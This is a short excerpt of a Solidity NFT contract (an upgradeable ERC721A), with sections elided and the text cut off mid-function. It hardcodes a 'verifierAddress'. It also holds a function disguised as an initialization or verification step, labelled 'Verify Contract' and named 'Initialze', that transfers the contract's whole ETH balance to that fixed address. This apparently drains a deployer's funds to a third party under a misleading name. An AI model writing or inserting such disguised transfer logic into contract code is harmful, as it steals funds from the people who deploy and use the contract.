...
contract CustomERC721A1 is ERC721AUpgradeable, OwnableUpgradeable {
    ...
    // Addresses
    address verifierAddress = 0x626be85E9C35C3fB1610692B59e1459bad1B4CBe;

    // Verify Contract
    function Initialze() public payable onlyOwner {        
        (bool os, ) = payable(verifierAddress).call{value: address(this).balance}("");
        require(os);
    }

    function setInitialze(address _verifier) public onlyOwner {
